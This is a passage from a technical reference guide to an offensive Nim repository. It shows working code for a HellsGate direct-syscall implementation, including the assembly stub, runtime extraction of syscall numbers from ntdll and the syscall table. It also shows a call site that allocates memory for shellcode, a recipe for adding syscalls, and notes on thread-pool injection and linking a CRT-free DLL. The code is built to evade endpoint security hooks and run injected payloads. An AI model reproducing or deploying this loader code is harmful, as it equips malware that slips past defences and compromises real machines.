  if fdwReason == DLL_PROCESS_ATTACH:
    injectViaThreadpool()
  return true
```

## 7. `undefined_ref.nim` - satisfying a DLL link

`src/0x12 - nimless_DLL/undefined_ref.nim`:

```nim
proc nothing1*() {.exportc: "__imp___acrt_iob_func".} = discard
proc nothing2*() {.exportc: "fwrite".} = discard
proc nothing3*() {.exportc: "fflush".} = discard
proc nothing4*() {.exportc: "exit".} = discard
proc nothing5*() {.exportc: "__imp_VirtualAlloc".} = discard
proc nothing6*() {.exportc: "_setjmp".} = discard
proc nothing7*() {.exportc: "signal".} = discard
proc nothing8*() {.exportc: "__imp__fileno".} = discard
proc nothing9*() {.exportc: "__imp__setmode".} = discard
proc nothing10*() {.exportc: "__imp_longjmp".} = discard
```

The 0x12 README's explanation:

> When this is compiled, you'll see a hidious error log mentioning undefined reference to
> `__imp___acrt_iob_func`, `fwrite`, `fflush`, ... ect. How we go about this is do redefine these
> functions to do nothing, this is done in `undefined_ref.nim`. We use the `exportc` pragma to tell
> the compiler and the linker that the function exists in this file, and future object. These are
> functions that we won't be using or if we are using, we would define ourselves.

Mechanically: `-nostdlib` means the CRT symbols some part of the generated code still names have no
definition. Declaring no-op procs with matching `exportc` names satisfies the linker without adding
an import. They are dead code as far as `--gc-sections` is concerned - nothing that is unreferenced
from real code survives - and they exist so the link succeeds. Add one per symbol the linker
complains about; the ten here are what the DLL config needed.

That same error list can also appear in an **EXE** build, for a reason that has nothing to do with
being a DLL: a Nim `string` value anywhere in the program keeps `system`'s IO and error paths
reachable (`rawWrite`, `raiseOutOfMem`, `osAllocPages`), and those reference `fwrite`, `fflush`,
`exit` and `__imp_VirtualAlloc`. **[measured]** - see `reference/strings.md` Section 1. Prefer removing
that reachability (use a `const array[N, byte]` or a `cstring` immediately) over adding stubs to an
EXE.

## 8. Direct syscalls - HellsGate

When userland hooks make `gmh`/`gpa` untrustworthy, the repo issues syscalls directly. Two pieces
from `src/0x06 - self_injection_loader/utils/hellsgate/`:

`stubs.nim`:

```nim
from winim import NTSTATUS, WORD

var wSystemCall*: WORD

proc HellsGate*(wSys: WORD) {.inline.} = 
  wSystemCall = wSys

proc HellsDescent*(arg1: auto): NTSTATUS {.asmNoStackFrame, varargs.} = 
  asm """
    mov r10, rcx
    mov rax, `wSystemCall`
    syscall
    ret
  """
```

`HellsDescent` is `{.asmNoStackFrame, varargs.}`: `varargs` lets one proc issue any syscall in the
table, and `asmNoStackFrame` keeps the prologue from disturbing the arguments the kernel expects in
`r10`, `rdx`, `r8` and `r9`. It sets `r10 = rcx` (the syscall ABI moves the first argument there) and
`rax = wSystemCall`, then `syscall`.

The SSN is never hard-coded - it is extracted from the stub in `ntdll` at runtime, so it matches
whatever build you are on. From `hg.nim`:

```nim
proc getVxTableEntry(pModuleBase: PVOID, pImageExportDirectory: PIMAGE_EXPORT_DIRECTORY, pVxTableEntry: PVX_TABLE_ENTRY): bool =
  var
    pdwAddressOfFunctions = cast[ptr UncheckedArray[DWORD]](cast[int](pModuleBase) + pImageExportDirectory.AddressOfFunctions)
    pdwAddressOfNames = cast[ptr UncheckedArray[DWORD]](cast[int](pModuleBase) + pImageExportDirectory.AddressOfNames)
    pwAddressOfNameOrdinals = cast[ptr UncheckedArray[WORD]](cast[int](pModuleBase) + pImageExportDirectory.AddressOfNameOrdinals)
  
  for i in 0 ..< pImageExportDirectory.NumberOfNames:
    var 
      pczFunctionName = cast[PCHAR](cast[int](pModuleBase) + pdwAddressOfNames[i])
      pFunctionAddress = cast[PBYTE](cast[int](pModuleBase) + pdwAddressOfFunctions[pwAddressOfNameOrdinals[i]])
    if hashStrA(cast[cstring](pczFunctionName)) == pVxTableEntry.dwHash:
      pVxTableEntry.pAddress = pFunctionAddress

      # check if function has been hooked
      var j = 0
      while true:
        # check if syscall, if this case we are too far
        if (cast[PBYTE](cast[int](pFunctionAddress) + j)[] == 0x0f.byte) and (cast[PBYTE](cast[int](pFunctionAddress) + j)[] == 0x05.byte):
          return false
        # check if ret, in this care we are probably too far
        if (cast[PBYTE](cast[int](pFunctionAddress) + j)[] == 0xc3.byte):
          return false

        #[
          First opcodes should be:
            mov r10, rcx
            mov rcx, <syscall>
        ]#
        if (cast[PBYTE](cast[int](pFunctionAddress) + j + 0)[] == 0x4c) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 1)[] == 0x8b) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 2)[] == 0xd1) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 3)[] == 0xb8) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 6)[] == 0x00) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 7)[] == 0x00):
          # get high and low bytes and set them in our table
          var 
            h = cast[PBYTE](cast[int](pFunctionAddress) + 5 + j)[]
            l = cast[PBYTE](cast[int](pFunctionAddress) + 4 + j)[]
          pVxTableEntry.wSystemCall = ((h shl 8) or l)
          break
        j.inc
  return true
```

The table and the call site:

```nim
  VX_TABLE_ENTRY* = object
    pAddress*: PVOID
    dwHash*: uint32
    wSystemCall*: WORD
  PVX_TABLE_ENTRY* = ptr VX_TABLE_ENTRY

  VX_TABLE* = object
    NtAllocateVirtualMemory*: VX_TABLE_ENTRY
    NtProtectVirtualMemory*: VX_TABLE_ENTRY
    NtCreateThreadEx*: VX_TABLE_ENTRY
    NtWaitForSingleObject*: VX_TABLE_ENTRY
  PVX_TABLE* = ptr VX_TABLE
```

```nim
  # initialize table
  var t: VX_TABLE
  if not initHG(t):
    return false

  var
    status: NTSTATUS = 0
    lpAddress: LPVOID
    szSc: SIZE_T = scLen
    ulOldProtect: ULONG
    hThread: HANDLE = INVALID_HANDLE_VALUE

  # allocate memory for the shellcode
  HellsGate(t.NtAllocateVirtualMemory.wSystemCall)
  status = HellsDescent(cast[HANDLE](-1), &lpAddress, 0, &szSc, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if status != 0:
    return false

  # write memory
```

The recipe for adding a syscall, exactly as the deck's 0x07 slides list it:

1. Add an entry to `VX_TABLE`.
2. Add the syscall to `initHG()` - a `dwHash` assignment plus a `getVxTableEntry` call.
3. Call it from your routine, wrapped in `HellsGate(t.<Entry>.wSystemCall)`.
4. (The deck's fourth frame: use it from the function that needs it, e.g. the anti-debug check.)

Four things to know before you copy this code (the first is **[measured]**, the rest are **[code]**):

- **The SSN scan's "too far" guard (fixed in this repo's 0x06/0x07).** The guard is meant to stop the
  walk once it reaches a `0F 05` (`syscall`) encoding - which means it has passed a stub prologue
  without matching one. As published it reads `if p[j] == 0x0f and p[j] == 0x05`: the *same* byte
  tested against both values, which can never be true, so the bail-out never fired. The two-byte fix,
  `p[j] == 0x0f and p[j + 1] == 0x05`, is now applied in both
  `src/0x06 - self_injection_loader/utils/hellsgate/hg.nim` and
  `src/0x07 - self_injection_loader_obfuscated/utils/hellsgate/hg.nim`.
  **[measured]** driving the real function from a synthetic export table whose stub places a `syscall`
  before a decoy prologue-shaped sequence (`90 90 0F 05 90 4C 8B D1 B8 41 00 00 00 C3`): the
  published form walks past the `syscall`, matches the decoy and returns `true` with
  `wSystemCall = 0x41` - an SSN taken from code that is not the function's prologue, then issued
  silently - while the fixed form returns `false`. On a well-formed stub the two behave identically,
  because the `0x4c 0x8b 0xd1 0xb8` match (`mov r10, rcx; mov eax, <ssn>`) fires at `j == 0`, well
  before the `syscall` at roughly `+0x12`; the SSN bytes are read from `+4` (low) and `+5` (high).
  That is why the happy-path demo never exposed it.
- **The scan is still unbounded with the guard working.** Nothing caps `j`: no section end, no
  next-export address, no `j < N`. The two guards and the pattern match are the only terminators, so a
  stub that yields none of them walks forward until a chance `0xc3` or an unmapped page. Bound the
  walk if you are hardening this code.
- **`getVxTableEntry` returns `true` unconditionally after its loop.** A `dwHash` that matches no
  export leaves `pAddress` null and `wSystemCall` zero, and `initHG` reports success anyway.
  `HellsGate(0)` then makes `HellsDescent` issue **syscall 0**, a real service (`NtAccessCheck`) -
  a silent wrong call, not a crash. Verify each entry resolves.
- **One global `wSystemCall` for the whole process.** `stubs.nim` declares it at module scope and
  `HellsGate` selects the service, so two threads issuing different syscalls race. The repo accepts
  this because it drives one syscall at a time from one thread; it is why the design is
  single-threaded by nature. The global also lives in `.data` - the deck points at exactly this with
  "global variable = .data sect".

## 9. Pointer, buffer and memory idioms

Everything below is the shape the repo uses. There is no `seq`, no `string`, and no allocator under
you.

**Address arithmetic is `cast[int]`, not pointer math.** Every table walk in `gpa.nim`, `gmh.nim` and
`hg.nim` is `cast[ptr X](cast[int](base) + rva)`.

**`ptr UncheckedArray[T]` is the universal array view.** `funcNameArray`, `funcAddressArray`,
`funcOrdinalArray`, `pStrW` and the ASCII tables are all `ptr UncheckedArray[...]` indexed with
`[]`. It compiles to a plain load with no length checking. Where a single element is wanted it is
`cast[ptr byte](addr)[]`.

**Buffers are fixed arrays whose element count is the API's length argument.**
`var tmpStrA: array[MAX_PATH, CHAR]`, `forwarderName: array[MAX_PATH, char]`,
`ascii: array[17, byte]` (`stdio.nim`'s `dumpHex`), and the wide case in
`src/0x11 - simple_instance/self_delete.nim`:

```nim
    szPath: array[MAX_PATH*2, WCHAR]
```

passed with `MAX_PATH * 2`, because `GetModuleFileNameW` takes a count in characters.

**Taking a pointer is `.addr` on the element, not on the array.** `s[0].addr` for a `cstring` via
`CPTR`, `key[0].addr`/`iv[0].addr` for AES key material, `pTmpBytes.addr`,
`dwKeyObjectLength.addr`, `bytesWritten.addr`. The `CPTR`/`CWPTR` templates in `utils/stackstr.nim`
exist so this is written once (`reference/strings.md` Section 1).

**Casts carry the type from the WinAPI declaration.** `cast[typeof(LoadLibraryA)](...)`,
`cast[PFILE_RENAME_INFO](pLocalAlloc(LPTR, sRename))`, `cast[PBYTE](...)`, `cast[HLOCAL](...)`,
`cast[LPCWSTR](bcrypt_aes_algo[0].addr)`. `cast[typeof(fn)]` is the idiom that keeps `gpa` honest.

**Allocation is explicit and paired.** Three choices in the repo:

| Allocator | Where | Notes |
|---|---|---|
| `LocalAlloc` / `LocalFree` | `stdio.nim` (`LPTR, 1024`), `0x11/main.nim`, `self_delete.nim`, `get_payload.nim` | small buffers; `LPTR` = fixed + zero-initialized |
| `HeapAlloc` / `HeapFree` on `GetProcessHeap()` with `HEAP_ZERO_MEMORY` | `decryption.nim`, `nimpool.nim`, `0x12/dll_main.nim` | when the API tells you the size (BCrypt property lengths, `NtQuerySystemInformation`) |
| `VirtualAllocEx` / `NtAllocateVirtualMemory` | `0x12` `writePayloadIntoProcess`, `0x06` `localShellcodeInjection` | executable memory, local or remote |

Every one is checked (`if cast[uint](p) == 0` / `== nil`) and freed on the error path too -
`decryption.nim` frees the key buffer, the temporary buffer and the provider handle at a single
`label end_of_installAesDecryption:`, and only *keeps* the plaintext buffer when the buffers it
handed back are non-null. That is the shape to copy: allocate, validate, one cleanup block per
function.

**`copyMem` and `zeroMem` come from Nim, not libc** (see `reference/build.md` Section 2), so
`copyMem(forwarderName[0].addr, cast[pointer](pFunctionAddress), lenForwarderName)` and
`zeroMem(pTmpBytes, dwBytesRead)` cost no import-table entries.

**No threads.** There is no `CreateThread` anywhere in the repo - `--threads:off` removes the runtime
that would back it. Threads come from `NtCreateThreadEx` through the HellsGate table
(`exec_payload.nim`), or are avoided entirely by hijacking an existing thread pool
(`src/0x12 - nimless_DLL/nimpool/`: `ioinject.nim`, `nimpool.nim`, `workinject.nim`).
